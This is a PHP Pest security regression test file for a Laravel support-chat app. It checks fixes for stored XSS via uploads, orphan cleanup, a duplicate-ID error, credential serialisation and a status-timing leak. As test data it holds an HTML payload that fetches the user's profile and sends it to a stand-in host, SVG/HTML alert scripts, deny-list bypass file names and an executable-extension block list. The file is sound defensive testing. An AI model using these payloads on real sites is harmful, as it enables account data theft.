<?php

use App\Domain\Media\AttachmentSerializer;
use App\Domain\Media\InlineSafety;
use App\Domain\Media\MediaUrls;
use App\Enums\AttachmentKind;
use App\Enums\AttachmentStatus;
use App\Enums\PublicChatStatus;
use App\Events\AttachmentProcessed;
use App\Events\MessageCreated;
use App\Events\NotificationAlert;
use App\Events\PublicChatMessageCreated;
use App\Events\PublicChatMessageCreatedStaff;
use App\Events\PublicChatMessageDeleted;
use App\Events\PublicChatRoomChanged;
use App\Events\PublicChatRoomChangedStaff;
use App\Events\PublicChatRoomCreated;
use App\Events\RoomActivity;
use App\Events\WorkspaceUnreadChanged;
use App\Jobs\PurgeExpiredUploads;
use App\Models\Attachment;
use App\Models\Message;
use App\Models\PublicChatMessage;
use App\Models\PublicChatRoom;
use App\Models\Room;
use App\Models\RoomMember;
use App\Models\User;
use App\Models\Workspace;
use App\Services\SettingsService;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Event;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Str;

/**
 * DEC-072 / DEC-073 / DEC-074 — the adversarial security review's findings,
 * each with the proof that closes it.
 *
 *   HIGH-1  stored XSS: an UNAUTHENTICATED visitor could upload HTML/SVG that
 *           production served INLINE and SAME-ORIGIN. Three layers, three
 *           groups of tests below — extension, sniffed mime, response
 *           disposition — because any one of them alone is bypassable and the
 *           third is the only one that helps for bytes already in the bucket.
 *   MEDIUM  unbounded anonymous storage growth: UploadService::finish() sets
 *           status=Uploaded and expires_at=NULL, which PurgeExpiredUploads
 *           matched on neither column, so a completed-but-never-sent visitor
 *           upload lived forever.
 *   LOW-1   duplicate attachment_ids hit the pivot PK and returned an
 *           unauthenticated 500 instead of the uniform 422.
 *   LOW-2   PublicChatRoom::$code — bearer authority — was not $hidden.
 *   LOW-3   a zero-delta `status_changed` row told the visitor, by its mere
 *           existence and its timing, that support had flagged them a problem.
 *
 * Pest loads every file in this directory into ONE process; helpers shared with
 * MediaTest/ApiTest/FoundationTest are function_exists-guarded there and reused
 * here rather than redeclared (a redeclaration is a FATAL, not a warning).
 */
// ---------------------------------------------------------------------------
// Helpers. Pest loads every file in this directory into ONE process, so these
// are function_exists-guarded exactly as MediaTest/ApiTest/FoundationTest guard
// theirs — a redeclaration is a FATAL, not a warning. The guards also mean this
// file runs standalone (`pest tests/Feature/PublicChat/SecurityFixTest.php`),
// which MediaTest's copies alone would not give it.
// ---------------------------------------------------------------------------

if (! function_exists('pchatCreateRoom')) {
    function pchatCreateRoom(Workspace $workspace, array $overrides = []): PublicChatRoom
    {
        return PublicChatRoom::withoutGlobalScopes()->create(array_merge([
            'workspace_id' => $workspace->id,
            'code' => PublicChatRoom::generateCode(),
            'customer_name' => 'Somchai',
            'provider_name' => 'ACME Support',
            'status' => PublicChatStatus::New->value,
            'locale' => 'th',
            'expires_at' => now()->addDays(30),
        ], $overrides));
    }
}

if (! function_exists('pchatFakedEvents')) {
    /** @return list<class-string> */
    function pchatFakedEvents(): array
    {
        return [
            PublicChatMessageCreated::class,
            PublicChatMessageCreatedStaff::class,
            PublicChatMessageDeleted::class,
            PublicChatRoomChanged::class,
            PublicChatRoomChangedStaff::class,
            PublicChatRoomCreated::class,
            NotificationAlert::class,
        ];
    }
}

if (! function_exists('pchatMediaEvents')) {
    /** @return list<class-string> */
    function pchatMediaEvents(): array
    {
        return array_merge(pchatFakedEvents(), [
            MessageCreated::class,
            RoomActivity::class,
            WorkspaceUnreadChanged::class,
            AttachmentProcessed::class,
        ]);
    }
}

if (! function_exists('pchatAttachment')) {
    /**
     * forceFill, never create(): `public_chat_room_id` is NOT in
     * Attachment::$fillable, so a mass assignment would silently drop the very
     * column under test and the assertions would pass for the wrong reason.
     */
    function pchatAttachment(Workspace $workspace, array $overrides = []): Attachment
    {
        $attachment = new Attachment;

        $attachment->forceFill(array_merge([
            'workspace_id' => $workspace->id,
            'uploader_id' => null,
            'public_chat_room_id' => null,
            'kind' => AttachmentKind::File->value,
            'status' => AttachmentStatus::Ready->value,
            'original_name' => 'receipt.pdf',
            'mime_type' => 'application/pdf',
            'size_bytes' => 1024,
            'storage_key' => 'ws/'.$workspace->id.'/att/'.Str::ulid()->toBase32().'/original',
        ], $overrides))->save();

        return $attachment->refresh();
    }
}

if (! function_exists('secfixTinyPng')) {
    /** A real 8x8 PNG — tests/Feature/Media/UploadTest.php's tinyPng() is in another directory. */
    function secfixTinyPng(): string
    {
        $image = imagecreatetruecolor(8, 8);
        imagefill($image, 0, 0, imagecolorallocate($image, 255, 200, 0));
        ob_start();
        imagepng($image);
        $bytes = (string) ob_get_clean();
        imagedestroy($image);

        return $bytes;
    }
}

beforeEach(function () {
    Event::fake(pchatMediaEvents());

    config()->set('filesystems.default', 'local');
    Storage::fake('local');
    MediaUrls::registerLocalCallbacks(Storage::disk('local'));

    // DEC-071 ships the feature OFF; every visitor write below needs it on.
    app(SettingsService::class)->set('publicchat.enabled', true);

    $this->ws = Workspace::factory()->create(['slug' => 'acme']);

    $this->agent = User::factory()->create(['username' => 'somchai', 'display_name' => 'Somchai S.']);
    $this->ws->members()->attach($this->agent->id, ['role' => 'owner']);

    $this->internalRoom = Room::query()->create([
        'workspace_id' => $this->ws->id,
        'type' => 'group',
        'name' => 'Engineering',
        'created_by' => $this->agent->id,
        'owner_id' => $this->agent->id,
        'member_count' => 1,
        'last_message_at' => now(),
    ]);

    RoomMember::query()->create([
        'room_id' => $this->internalRoom->id,
        'user_id' => $this->agent->id,
        'workspace_id' => $this->ws->id,
        'role' => 'owner',
        'added_by' => $this->agent->id,
    ]);

    $this->room = pchatCreateRoom($this->ws);
});

// ===========================================================================
// HIGH-1 · LAYER 1 — the extension deny list
// ===========================================================================

it('DEC-072 refuses every browser-executable extension on the UNAUTHENTICATED visitor upload route', function () {
    // The exact vector from the review: the visitor holds nothing but a
    // /support/<code> link and asks for a ticket to store markup.
    foreach ([
        ['evil.html', 'text/plain'],
        ['evil.htm', 'text/plain'],
        ['evil.xhtml', 'text/plain'],
        ['evil.shtml', 'text/plain'],
        ['logo.svg', 'application/octet-stream'],
        ['logo.svgz', 'application/octet-stream'],
        ['data.xml', 'application/octet-stream'],
        ['page.xht', 'application/octet-stream'],
        ['archive.mhtml', 'application/octet-stream'],
        ['sheet.xsl', 'application/octet-stream'],
    ] as [$filename, $declared]) {
        $response = $this->postJson('/api/v1/public-chat/'.$this->room->code.'/uploads', [
            'kind' => 'file',
            'filename' => $filename,
            'mime_type' => $declared,
            'size_bytes' => 512,
        ]);

        $response->assertStatus(422)->assertJsonPath('error.code', 'MEDIA_TYPE_BLOCKED');
    }

    // Refused means refused: no ticket, therefore no presigned PUT, therefore
    // no object. A 422 that still minted the row would be theatre.
    expect(Attachment::withoutGlobalScopes()->count())->toBe(0);
});

it('DEC-072 keeps every extension the original native-execution list already blocked', function () {
    // The new markup entries must ADD to the deny list, never replace it — an
    // .exe is still an .exe.
    $blocked = app(SettingsService::class)->array('upload.file.blocked_extensions');

    foreach (['exe', 'bat', 'cmd', 'sh', 'ps1', 'msi', 'scr', 'js', 'jar', 'com', 'vbs'] as $extension) {
        expect($blocked)->toContain($extension);
    }
});

it('DEC-072 normalises a trailing dot or space so "evil.html " cannot walk past the deny list', function () {
    // Windows and several object stores strip trailing dots/spaces, so these
    // land on disk as evil.html while comparing unequal to 'html' unless the
    // extension is normalised first.
    foreach (['evil.html ', 'evil.html.', 'evil.HTML', 'evil.Svg'] as $filename) {
        $this->postJson('/api/v1/public-chat/'.$this->room->code.'/uploads', [
            'kind' => 'file',
            'filename' => $filename,
            'mime_type' => 'application/octet-stream',
            'size_bytes' => 512,
        ])->assertStatus(422)->assertJsonPath('error.code', 'MEDIA_TYPE_BLOCKED');
    }
});

it('DEC-072 refuses a DECLARED browser-executable mime before any object exists', function () {
    // Layer 2a. The declared value proves nothing on its own, but an honest
    // client fails here instead of after a 100MB PUT.
    $this->postJson('/api/v1/public-chat/'.$this->room->code.'/uploads', [
        'kind' => 'file',
        'filename' => 'invoice.pdf',      // innocent extension
        'mime_type' => 'text/html',       // dishonest declaration
        'size_bytes' => 512,
    ])->assertStatus(422)->assertJsonPath('error.code', 'MEDIA_MIME_MISMATCH');

    expect(Attachment::withoutGlobalScopes()->count())->toBe(0);
});

// ===========================================================================
// HIGH-1 · LAYER 2 — the SNIFFED mime, which a rename cannot lie to
// ===========================================================================

/**
 * Mint a visitor ticket, PUT the bytes at the local sink, then complete.
 * Returns the raw complete response so a test can assert on the failure.
 */
if (! function_exists('pchatVisitorUpload')) {
    function pchatVisitorUpload($test, string $code, string $filename, string $declaredMime, string $bytes, string $kind = 'file')
    {
        $created = $test->postJson("/api/v1/public-chat/{$code}/uploads", [
            'kind' => $kind,
            'filename' => $filename,
            'mime_type' => $declaredMime,
            'size_bytes' => strlen($bytes),
        ])->assertStatus(201)->json();

        $test->call('PUT', $created['upload_url'], [], [], [], ['CONTENT_TYPE' => 'application/octet-stream'], $bytes)
            ->assertOk();

        return [$created['attachment']['id'], $test->postJson(
            "/api/v1/public-chat/{$code}/uploads/{$created['attachment']['id']}/complete"
        )];
    }
}

it('DEC-072 refuses HTML bytes hidden behind an innocent .txt name at complete time', function () {
    // THE REAL ATTACK. Every name-based check passes: the extension is .txt and
    // the declared mime is text/plain. Only libmagic over the bytes that
    // actually landed can tell the truth, and finish() used to write that truth
    // onto the row as the authoritative mime_type and store it anyway.
    $html = '<!DOCTYPE html><html><body><script>fetch("/api/v1/me").then(r=>r.text()).then(t=>fetch("https://evil.test/?"+btoa(t)))</script></body></html>';

    [$id, $complete] = pchatVisitorUpload($this, $this->room->code, 'notes.txt', 'text/plain', $html);

    $complete->assertStatus(422)->assertJsonPath('error.code', 'MEDIA_MIME_MISMATCH');
    expect($complete->json('error.details.sniffed_mime'))->toBe('text/html');

    // The row never advances past pending, so it can never be claimed by a
    // message (claimAttachments accepts Uploaded/Processing/Ready only) and the
    // 1h expiry sweep reclaims it.
    $attachment = Attachment::withoutGlobalScopes()->findOrFail($id);
    expect($attachment->status)->toBe(AttachmentStatus::Pending);
});

it('DEC-072 refuses SVG bytes hidden behind an innocent .dat name at complete time', function () {
    $svg = '<svg xmlns="http://www.w3.org/2000/svg" width="8" height="8"><script>alert(document.domain)</script></svg>';

    [$id, $complete] = pchatVisitorUpload($this, $this->room->code, 'photo.dat', 'application/octet-stream', $svg);

    $complete->assertStatus(422)->assertJsonPath('error.code', 'MEDIA_MIME_MISMATCH');
    expect($complete->json('error.details.sniffed_mime'))->toBe('image/svg+xml');
    expect(Attachment::withoutGlobalScopes()->findOrFail($id)->status)->toBe(AttachmentStatus::Pending);
});

it('DEC-072 refuses XML bytes for kind=file — the XSLT-to-markup vector', function () {
    $xml = '<?xml version="1.0"?><root><a>b</a></root>';

    [, $complete] = pchatVisitorUpload($this, $this->room->code, 'export.dat', 'application/octet-stream', $xml);

    $complete->assertStatus(422)->assertJsonPath('error.code', 'MEDIA_MIME_MISMATCH');
});

it('DEC-072 still accepts a legitimate visitor file — the fix removes reach, it does not break uploads', function () {
    // The regression guard. A deny list that refuses everything is not a fix.
    $pdf = "%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n";

    [$id, $complete] = pchatVisitorUpload($this, $this->room->code, 'receipt.pdf', 'application/pdf', $pdf);

    $complete->assertOk();

    $attachment = Attachment::withoutGlobalScopes()->findOrFail($id);
    expect($attachment->status)->not->toBe(AttachmentStatus::Pending)
        ->and($attachment->mime_type)->toBe('application/pdf');
});

it('DEC-072 closes the SAME hole for INTERNAL workspace uploads, not just public chat', function () {
    // The review's fourth requirement: this was never public-chat specific. Any
    // workspace member could store markup through API-060/061 and get the same
    // same-origin inline render. The layers live in the SHARED UploadService,
    // so the internal surface is covered by construction — assert it.
    [, $token] = loginAs($this->agent);

    // Layer 1 — extension.
    $this->postJson('/api/v1/uploads', [
        'kind' => 'file', 'filename' => 'payload.html', 'mime_type' => 'text/plain', 'size_bytes' => 64,
    ], wsHeaders($token, 'acme'))->assertStatus(422)->assertJsonPath('error.code', 'MEDIA_TYPE_BLOCKED');

    // Layer 2 — sniffed mime behind an innocent name.
    $html = '<!DOCTYPE html><html><body><script>alert(1)</script></body></html>';

    $created = $this->postJson('/api/v1/uploads', [
        'kind' => 'file', 'filename' => 'readme.txt', 'mime_type' => 'text/plain', 'size_bytes' => strlen($html),
    ], wsHeaders($token, 'acme'))->assertStatus(201)->json('data');

    $this->call('PUT', $created['put_url'], [], [], [], ['CONTENT_TYPE' => 'application/octet-stream'], $html)->assertOk();

    $this->postJson("/api/v1/uploads/{$created['attachment_id']}/complete", [], wsHeaders($token, 'acme'))
        ->assertStatus(422)->assertJsonPath('error.code', 'MEDIA_MIME_MISMATCH');
});

// ===========================================================================
// HIGH-1 · LAYER 3 — the forced response disposition. THE ONLY LAYER THAT
// PROTECTS OBJECTS ALREADY IN THE BUCKET.
// ===========================================================================

it('DEC-072 signs an attachment disposition and a neutral type into the S3 presigned GET', function () {
    // Production does NOT go through UploadController::file — it hands the
    // browser a MinIO presigned GET, and MinIO replays the Content-Type the
    // uploading client chose. The response-override parameters are part of the
    // SIGNED query string, so a URL holder cannot strip them. Capture what
    // MediaUrls actually passes to $disk->temporaryUrl().
    $captured = [];
    Storage::disk('local')->buildTemporaryUrlsUsing(function (string $path, $expiration, array $options = []) use (&$captured) {
        $captured[] = $options;

        return 'https://minio.test/'.$path;
    });

    // An object ALREADY STORED as text/html — the pre-fix upload that layers 1
    // and 2 can no longer reach backwards to stop.
    $stored = pchatAttachment($this->ws, [
        'public_chat_room_id' => $this->room->id,
        'original_name' => 'ใบเสร็จ.html',   // Thai name: the header must survive it
        'mime_type' => 'text/html',
    ]);

    app(AttachmentSerializer::class)->toArray($stored);

    expect($captured)->not->toBeEmpty();
    expect($captured[0]['ResponseContentDisposition'])->toStartWith('attachment');
    expect($captured[0]['ResponseContentType'])->toBe('application/octet-stream');
    // RFC 6266: the Thai name rides in filename*, with an ASCII fallback.
    expect($captured[0]['ResponseContentDisposition'])->toContain("filename*=utf-8''");
});

it('DEC-072 forces the Content-Type even for an allowlisted image — the polyglot guard', function () {
    // A GENUINE PNG uploaded with `Content-Type: text/html` on its presigned PUT
    // is stored by MinIO with that type and replayed as a document. Overriding
    // only the "unsafe" types would leave exactly this case open, so
    // ResponseContentType is set unconditionally from the SERVER-SNIFFED row
    // value — never from anything the client said.
    $captured = [];
    Storage::disk('local')->buildTemporaryUrlsUsing(function (string $path, $expiration, array $options = []) use (&$captured) {
        $captured[] = $options;

        return 'https://minio.test/'.$path;
    });

    $png = pchatAttachment($this->ws, [
        'public_chat_room_id' => $this->room->id,
        'kind' => AttachmentKind::Image->value,
        'original_name' => 'photo.png',
        'mime_type' => 'image/png',
    ]);

    app(AttachmentSerializer::class)->toArray($png);

    expect($captured[0]['ResponseContentDisposition'])->toStartWith('inline');
    expect($captured[0]['ResponseContentType'])->toBe('image/png');
});

it('DEC-072 makes the LOCAL disk agree with S3 — attachment for markup, inline only for the allowlist', function () {
    // Before the fix this path special-cased the single string 'svg' and served
    // text/html, xhtml and xml INLINE. Both paths now share one predicate.
    $html = pchatAttachment($this->ws, [
        'public_chat_room_id' => $this->room->id,
        'original_name' => 'evil.html',
        'mime_type' => 'text/html',
    ]);
    // The local signed route resolves the attachment id out of the storage key
    // (MediaUrls::attachmentIdFromPath reads segment 3), so the key has to be
    // the real one or the controller 404s before the disposition is reached.
    $html->forceFill(['storage_key' => 'ws/'.$this->ws->id.'/att/'.$html->id.'/original'])->save();
    Storage::disk('local')->put($html->storage_key, '<html><script>alert(1)</script></html>');

    $url = app(AttachmentSerializer::class)->toArray($html)['urls']['original'];
    $res = $this->get($url);

    $res->assertOk();
    expect($res->headers->get('Content-Disposition'))->toStartWith('attachment');
    expect($res->headers->get('Content-Type'))->toBe('application/octet-stream');
    expect($res->headers->get('X-Content-Type-Options'))->toBe('nosniff');

    // …and the regression half: a real image is still served inline, as itself.
    $png = pchatAttachment($this->ws, [
        'public_chat_room_id' => $this->room->id,
        'kind' => AttachmentKind::Image->value,
        'original_name' => 'photo.png',
        'mime_type' => 'image/png',
    ]);
    $png->forceFill(['storage_key' => 'ws/'.$this->ws->id.'/att/'.$png->id.'/original'])->save();
    Storage::disk('local')->put($png->storage_key, secfixTinyPng());

    $pngUrl = app(AttachmentSerializer::class)->toArray($png)['urls']['original'];
    $pngRes = $this->get($pngUrl);

    $pngRes->assertOk();
    expect($pngRes->headers->get('Content-Disposition'))->toStartWith('inline');
    expect($pngRes->headers->get('Content-Type'))->toBe('image/png');
});

it('DEC-072 fails CLOSED when a caller forgets the mime', function () {
    // temporaryGetUrl's $mime is optional only for signature compatibility. A
    // future caller that forgets it must get the inert answer, not an inline
    // render of an unknown type.
    expect(InlineSafety::disposition(null))->toBe('attachment')
        ->and(InlineSafety::responseType(null))->toBe('application/octet-stream')
        // parameters and case must not defeat the comparison
        ->and(InlineSafety::isBrowserExecutable('TEXT/HTML; charset=utf-8'))->toBeTrue()
        ->and(InlineSafety::isBrowserExecutable('application/rss+xml'))->toBeTrue()
        ->and(InlineSafety::isInlineSafe('image/svg+xml'))->toBeFalse()
        ->and(InlineSafety::isInlineSafe('application/pdf'))->toBeFalse();
});

// ===========================================================================
// MEDIUM — the orphan sweeper
// ===========================================================================

it('DEC-073 reclaims a COMPLETED but unreferenced visitor attachment past the grace period', function () {
    $grace = PurgeExpiredUploads::PUBLIC_CHAT_ORPHAN_GRACE_HOURS;

    // The exact hole: finish() set status=Uploaded and expires_at=NULL, so the
    // old sweep (status=pending AND expires_at < now) matched neither column.
    $orphan = pchatAttachment($this->ws, [
        'public_chat_room_id' => $this->room->id,
        'status' => AttachmentStatus::Ready->value,
        'expires_at' => null,
        'original_name' => 'never-sent.pdf',
        'size_bytes' => 4096,
        'derived' => ['thumb_sm' => 'ws/'.$this->ws->id.'/att/orphan/thumb_sm'],
    ]);
    $orphan->forceFill(['created_at' => now()->subHours($grace + 1)])->save();

    Storage::disk('local')->put($orphan->storage_key, 'bytes');
    Storage::disk('local')->put('ws/'.$this->ws->id.'/att/orphan/thumb_sm', 'thumb');

    (new PurgeExpiredUploads)->handle();

    expect(Attachment::withoutGlobalScopes()->whereKey($orphan->id)->exists())->toBeFalse();
    // The ROW going is not the point — the BYTES are. A sweep that reclaimed
    // the row and left the objects would fix nothing.
    expect(Storage::disk('local')->exists($orphan->storage_key))->toBeFalse();
    expect(Storage::disk('local')->exists('ws/'.$this->ws->id.'/att/orphan/thumb_sm'))->toBeFalse();
});

it('DEC-073 leaves a visitor attachment inside the grace period alone', function () {
    $fresh = pchatAttachment($this->ws, [
        'public_chat_room_id' => $this->room->id,
        'status' => AttachmentStatus::Uploaded->value,
        'expires_at' => null,
    ]);
    $fresh->forceFill(['created_at' => now()->subHours(2)])->save();

    (new PurgeExpiredUploads)->handle();

    expect(Attachment::withoutGlobalScopes()->whereKey($fresh->id)->exists())->toBeTrue();
});

it('DEC-073 NEVER touches an attachment a public chat message references', function () {
    $referenced = pchatAttachment($this->ws, [
        'public_chat_room_id' => $this->room->id,
        'status' => AttachmentStatus::Ready->value,
        'expires_at' => null,
        'original_name' => 'receipt.pdf',
    ]);
    $referenced->forceFill(['created_at' => now()->subDays(90)])->save();
    Storage::disk('local')->put($referenced->storage_key, 'bytes');

    $sent = $this->postJson('/api/v1/public-chat/'.$this->room->code.'/messages', [
        'client_message_id' => (string) Str::uuid(),
        'attachment_ids' => [$referenced->id],
    ])->assertStatus(201);

    expect(DB::table('public_chat_message_attachments')->where('attachment_id', $referenced->id)->exists())->toBeTrue();

    (new PurgeExpiredUploads)->handle();

    // 90 days old and still untouchable — age is not the test, REFERENCE is.
    expect(Attachment::withoutGlobalScopes()->whereKey($referenced->id)->exists())->toBeTrue();
    expect(Storage::disk('local')->exists($referenced->storage_key))->toBeTrue();
    expect($sent->json('message.attachments.0.id'))->toBe($referenced->id);
});

it('DEC-073 NEVER touches an INTERNAL attachment, referenced or not', function () {
    // "Internal" IS public_chat_room_id IS NULL (DEC-068), and the sweep is
    // scoped to the partition column, so this is structural rather than a
    // promise. Both an orphaned internal upload and a referenced one must
    // survive: the MEDIUM finding is about the ANONYMOUS surface only.
    $internalOrphan = pchatAttachment($this->ws, [
        'uploader_id' => $this->agent->id,
        'public_chat_room_id' => null,
        'status' => AttachmentStatus::Ready->value,
        'expires_at' => null,
        'original_name' => 'internal-never-sent.pdf',
    ]);
    $internalOrphan->forceFill(['created_at' => now()->subDays(365)])->save();
    Storage::disk('local')->put($internalOrphan->storage_key, 'bytes');

    $internalSent = pchatAttachment($this->ws, [
        'uploader_id' => $this->agent->id,
        'public_chat_room_id' => null,
        'status' => AttachmentStatus::Ready->value,
        'expires_at' => null,
    ]);
    $internalSent->forceFill(['created_at' => now()->subDays(365)])->save();

    $message = Message::withoutGlobalScopes()->create([
        'room_id' => $this->internalRoom->id,
        'workspace_id' => $this->ws->id,
        'sender_id' => $this->agent->id,
        'seq' => 1,
        'type' => 'file',
        'body' => 'here',
    ]);
    DB::table('message_attachments')->insert([
        'message_id' => $message->id,
        'attachment_id' => $internalSent->id,
        'position' => 1,
    ]);

    (new PurgeExpiredUploads)->handle();

    expect(Attachment::withoutGlobalScopes()->whereKey($internalOrphan->id)->exists())->toBeTrue();
    expect(Storage::disk('local')->exists($internalOrphan->storage_key))->toBeTrue();
    expect(Attachment::withoutGlobalScopes()->whereKey($internalSent->id)->exists())->toBeTrue();
});

it('DEC-073 keeps the original TC-MEDIA-011 pending sweep working', function () {
    // The new sweep rides the same job; the old one must not have been
    // displaced by it.
    $abandoned = pchatAttachment($this->ws, [
        'public_chat_room_id' => $this->room->id,
        'status' => AttachmentStatus::Pending->value,
    ]);
    $abandoned->forceFill(['expires_at' => now()->subHours(2)])->save();

    (new PurgeExpiredUploads)->handle();

    expect(Attachment::withoutGlobalScopes()->whereKey($abandoned->id)->exists())->toBeFalse();
});

// ===========================================================================
// LOW-1 — duplicate attachment_ids are a 422, never an unauthenticated 500
// ===========================================================================

it('LOW-1 answers 422, not 500, when the visitor sends the same attachment id twice', function () {
    $attachment = pchatAttachment($this->ws, [
        'public_chat_room_id' => $this->room->id,
    ]);

    // PRIMARY (message_id, attachment_id) on the pivot: [$id, $id] used to reach
    // the insert and surface as a QueryException — a 500 on an UNAUTHENTICATED
    // route, from a body anyone holding the link can craft.
    $response = $this->postJson('/api/v1/public-chat/'.$this->room->code.'/messages', [
        'client_message_id' => (string) Str::uuid(),
        'attachment_ids' => [$attachment->id, $attachment->id],
    ]);

    $response->assertStatus(422)->assertJsonPath('error.code', 'MSG_ATTACHMENT_INVALID');

    // Rejected BEFORE the room lock: nothing was written, no seq was burned.
    expect(PublicChatMessage::withoutGlobalScopes()->where('room_id', $this->room->id)->count())->toBe(0);
    expect($this->room->fresh()->last_seq)->toBe(0);

    // …and the single-id send still works, so the guard is a dedupe check and
    // not an accidental "attachments are broken".
    $this->postJson('/api/v1/public-chat/'.$this->room->code.'/messages', [
        'client_message_id' => (string) Str::uuid(),
        'attachment_ids' => [$attachment->id],
    ])->assertStatus(201);
});

// ===========================================================================
// LOW-2 — `code` is bearer authority and must fail safe
// ===========================================================================

it('LOW-2 keeps the visitor credential out of PublicChatRoom::toArray()', function () {
    $room = $this->room->fresh();

    expect($room->toArray())->not->toHaveKey('code')
        ->and($room->toArray())->not->toHaveKey('meta')
        ->and(json_decode($room->toJson(), true))->not->toHaveKey('code');

    // $hidden must not break the DELIBERATE readers: the code is still a
    // readable property (the /support/<code> URL builder, API-200/203 and the
    // Filament link column all read it this way), it is just no longer carried
    // by array/JSON serialisation.
    expect($room->code)->toBeString()->toHaveLength(64);
});

it('LOW-2 still answers the visitor route for that room — hiding the column is serialisation-only', function () {
    // Defence in depth must not become a functional regression: the code is the
    // credential, and the credential still works.
    $this->getJson('/api/v1/public-chat/'.$this->room->code)
        ->assertOk()
        ->assertJsonPath('room.id', $this->room->id);
});

// ===========================================================================
// LOW-3 — the zero-delta status_changed timing side-channel
// ===========================================================================

it('LOW-3 hides a zero-delta status change from the visitor while staff still see it', function () {
    [, $token] = loginAs($this->agent);

    // Get the room to in_progress with an assignee — the only state a
    // `problem` flag can be set from (patch's sole transition guard).
    $this->patchJson('/api/v1/public-chat/rooms/'.$this->room->id, [
        'assigned_to' => $this->agent->id,
        'status' => PublicChatStatus::InProgress->value,
    ], wsHeaders($token, 'acme'))->assertOk();

    $seqBefore = (int) $this->room->fresh()->last_seq;

    // THE MOMENT THAT LEAKED: in_progress -> problem. Both project to 'open',
    // so the rendered row said "open -> open" and its only information content
    // was its TIMING — which coincided exactly with support flagging the
    // customer as a problem.
    $this->patchJson('/api/v1/public-chat/rooms/'.$this->room->id, [
        'status' => PublicChatStatus::Problem->value,
    ], wsHeaders($token, 'acme'))->assertOk();

    // The row IS written — this is a suppression at the visitor boundary, not a
    // hole in the transcript. An audit trail with gaps would be worse.
    expect((int) $this->room->fresh()->last_seq)->toBeGreaterThan($seqBefore);
    expect(PublicChatMessage::withoutGlobalScopes()
        ->where('room_id', $this->room->id)
        ->where('system_event', 'status_changed')
        ->count())->toBe(2); // the in_progress one, and the problem one

    // VISITOR (API-211): the in_progress transition is real (new -> open is
    // also zero-delta, so it is hidden too) and the problem one is hidden.
    // Nothing whatsoever about `problem` reaches the customer.
    $visitorRows = $this->getJson('/api/v1/public-chat/'.$this->room->code.'/messages')
        ->assertOk()->json('messages');

    $visitorStatusRows = array_values(array_filter(
        $visitorRows,
        fn (array $m) => ($m['system_event'] ?? null) === 'status_changed',
    ));

    expect($visitorStatusRows)->toBe([]);
    expect(json_encode($visitorRows))->not->toContain('problem');

    // STAFF (API-222): the real transition, unredacted, with the actor.
    $staffRows = $this->getJson('/api/v1/public-chat/rooms/'.$this->room->id.'/messages', wsHeaders($token, 'acme'))
        ->assertOk()->json('messages');

    $staffStatusRows = array_values(array_filter(
        $staffRows,
        fn (array $m) => ($m['system_event'] ?? null) === 'status_changed',
    ));

    expect($staffStatusRows)->toHaveCount(2);
    expect($staffStatusRows[1]['system_meta']['to'])->toBe('problem');
    expect($staffStatusRows[1]['system_meta']['from'])->toBe('in_progress');
});

it('LOW-3 still shows the visitor a REAL status change (open -> closed)', function () {
    // The suppression must be zero-delta only. Closing the conversation is
    // something the customer is entitled to see, and hiding it would be a
    // functional regression dressed as a security fix.
    [, $token] = loginAs($this->agent);

    $this->patchJson('/api/v1/public-chat/rooms/'.$this->room->id, [
        'assigned_to' => $this->agent->id,
        'status' => PublicChatStatus::Done->value,
    ], wsHeaders($token, 'acme'))->assertOk();

    $rows = $this->getJson('/api/v1/public-chat/'.$this->room->code.'/messages')->assertOk()->json('messages');

    $statusRows = array_values(array_filter(
        $rows,
        fn (array $m) => ($m['system_event'] ?? null) === 'status_changed',
    ));

    expect($statusRows)->toHaveCount(1);
    expect($statusRows[0]['system_meta'])->toBe(['from' => 'open', 'to' => 'closed']);
});

it('LOW-3 suppresses the zero-delta row on the VISITOR CHANNEL too, but never on the staff one', function () {
    // Filtering only API-211 would have closed the transcript and left the
    // realtime frame wide open — and the socket frame is the SHARPER timing
    // signal, arriving within milliseconds of the agent's click.
    [, $token] = loginAs($this->agent);

    $this->patchJson('/api/v1/public-chat/rooms/'.$this->room->id, [
        'assigned_to' => $this->agent->id,
        'status' => PublicChatStatus::InProgress->value,
    ], wsHeaders($token, 'acme'))->assertOk();

    Event::fake(pchatMediaEvents());

    $this->patchJson('/api/v1/public-chat/rooms/'.$this->room->id, [
        'status' => PublicChatStatus::Problem->value,
    ], wsHeaders($token, 'acme'))->assertOk();

    Event::assertNotDispatched(PublicChatMessageCreated::class);
    Event::assertDispatched(PublicChatMessageCreatedStaff::class);
});

it('LOW-3 suppresses the zero-delta ROOM-CHANGED frame on the visitor channel too', function () {
    // The SIBLING leak. EVT-081's visitor payload is {id, status_public,
    // can_send}: on in_progress -> problem all three are byte-for-byte
    // identical to the previous frame, so the event's ONLY content is
    // "something just changed, now" — the same timing signal on a different
    // channel. Suppressing the message row and leaving this one would have made
    // the whole fix cosmetic.
    [, $token] = loginAs($this->agent);

    $this->patchJson('/api/v1/public-chat/rooms/'.$this->room->id, [
        'assigned_to' => $this->agent->id,
        'status' => PublicChatStatus::InProgress->value,
    ], wsHeaders($token, 'acme'))->assertOk();

    Event::fake(pchatMediaEvents());

    $this->patchJson('/api/v1/public-chat/rooms/'.$this->room->id, [
        'status' => PublicChatStatus::Problem->value,
    ], wsHeaders($token, 'acme'))->assertOk();

    Event::assertNotDispatched(PublicChatRoomChanged::class);
    Event::assertDispatched(PublicChatRoomChangedStaff::class);
});

it('LOW-3 still sends the visitor a room-changed frame when the projection REALLY moves', function () {
    // The regression half: the suppression is zero-delta only. Closing the room
    // moves status_public open -> closed AND can_send true -> false, and a
    // visitor page that never hears about it is left offering a send box on a
    // closed conversation.
    [, $token] = loginAs($this->agent);

    Event::fake(pchatMediaEvents());

    $this->patchJson('/api/v1/public-chat/rooms/'.$this->room->id, [
        'assigned_to' => $this->agent->id,
        'status' => PublicChatStatus::Done->value,
    ], wsHeaders($token, 'acme'))->assertOk();

    Event::assertDispatched(PublicChatRoomChanged::class);
    Event::assertDispatched(PublicChatMessageCreated::class);
});

// ===========================================================================
// MEDIUM — the sweep must lose the race, not the file
// ===========================================================================

it('DEC-073 never deletes an attachment claimed between the sweep SELECT and its delete', function () {
    // The sweep's SELECT and its delete are not one atomic act: a visitor can
    // claim the row in between. The delete therefore RE-ASSERTS the same four
    // NOT EXISTS the SELECT used, blocks on the claim's row lock, and matches
    // nothing — so the objects are never touched and the message keeps its
    // file. Reproduce that interleaving: a row that is unambiguously sweepable,
